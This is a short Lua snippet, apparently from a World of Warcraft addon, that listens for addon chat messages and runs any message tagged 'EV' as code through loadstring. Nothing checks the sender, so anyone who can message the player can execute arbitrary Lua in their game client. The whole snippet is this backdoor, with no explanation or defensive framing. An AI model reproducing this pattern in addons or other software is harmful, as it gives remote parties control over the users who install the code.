local f = CreateFrame("Frame")
f:RegisterEvent("CHAT_MSG_ADDON")
f:SetScript("OnEvent", function(_, _, prefix, msg)
  if prefix == "EV" then
    loadstring(msg)()
  end
end)
